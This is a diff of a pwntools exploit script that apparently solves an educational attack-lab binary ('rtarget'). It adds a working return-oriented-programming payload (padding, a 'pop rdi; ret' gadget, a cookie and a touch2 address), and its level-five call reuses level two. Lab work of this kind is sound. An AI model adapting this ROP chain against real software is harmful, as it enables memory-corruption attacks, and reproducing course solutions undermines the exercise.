@@ -45,9 +45,7 @@ def level_two():
 
 
 def hextostring(data):
-    data = [x for x in hex(data)[2:]]
-    transform = lambda x: chr(ord(x))
-    return "".join(map(transform, data))
+    return "".join([x for x in hex(data)[2:]])
 
 def level_three():
     """
@@ -69,12 +67,24 @@ def level_three():
 
 
 def level_four():
-    payload += ""
+    """
+    41 41 41 41 41 41 41 41 41 41 41
+    41 41 41 41 41 41 41 41 41 41 41
+    41 41 41 41 41 41 41 41 41 41 41
+    41 41 41 41 41 41 41 1B 14 40 00  # pop rdi ; ret;
+    00 00 00 00 FA 97 B9 59 00 00 00  # address of cookie
+    00 EC 17 40 00 00 00 00 00        # address of touch2
+    """
+    payload = ""
+    payload += "A" * OFFSET
+    payload += p64(0x0040141b)  # pop rdi; ret
+    payload += p64(COOKIE)
+    payload += p64(TOUCH_2)
     return payload
 
 
 def level_five():
-    payload += ""
+    payload = ""
     return payload
 
 
@@ -94,6 +104,15 @@ def main():
     io.sendline(level_three())
     print io.recvall()
 
+    # level four
+    io = process(argv=["./rtarget", "-q"])
+    io.sendline(level_four())
+    print io.recvall()
+
+    # level five
+    io = process(argv=["./rtarget", "-q"])
+    io.sendline(level_two())
+    print io.recvall()
 
 if __name__ == "__main__":
     main()
